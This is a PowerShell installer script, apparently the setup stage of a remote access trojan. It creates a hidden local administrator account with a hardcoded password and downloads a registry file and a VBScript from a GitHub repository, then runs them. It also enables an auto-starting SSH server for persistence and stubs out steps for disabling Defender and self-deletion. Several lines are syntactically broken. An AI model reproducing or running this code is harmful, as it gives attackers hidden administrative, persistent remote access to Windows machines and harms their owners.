#biulds resources for the  rat
# created by Dark Lord


#random string for direcories
 function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
#attemp to disable the defender





#create local admin for the rat 
function create_account {
    [CmdletBinding()] 
    param (
        [string] $uname,
        [securestring] $pword
     )
     begin {
     }
        process {
            New-LocalUser "$uname" -pword $pword-FullName "$uname" -Description "Temporary local admin"
            write-Verbose "$uname local user crated" Add-LocalGroupMember -Group "Administrators" -Member "$uname"
            
        }
        end{  
        }

    }

#create admin user
$uname = "random_text"
$pword = (ConvertTo-SecureString "rat123"-AsPlainText -Force)
create_account  -uname $uname -pword $pword

#registry  to hide local admin
$reg_file = random_text
Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg -OutFile
"$reg_file.reg"




#visual basic script to registry
$vbs_file = random_text
Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile
"$vbs_file.vbs".ps1

#install the registry
./"$reg_file.reg";"$vbs_file.vbs"






#varaibles

$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location
 









#enabling  the presistance ssh 
Add-WindowsCapablity -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service sshd Set-Service  -Name sshd -StartupType 'Automatic' Get-NetFirewallRule - Name *ssh* 


#goto temp ,make working directory

 mkdir $path 
 cd $path 
 

 #self delete
 #cd $initial_dir
 #del installer.ps1


 

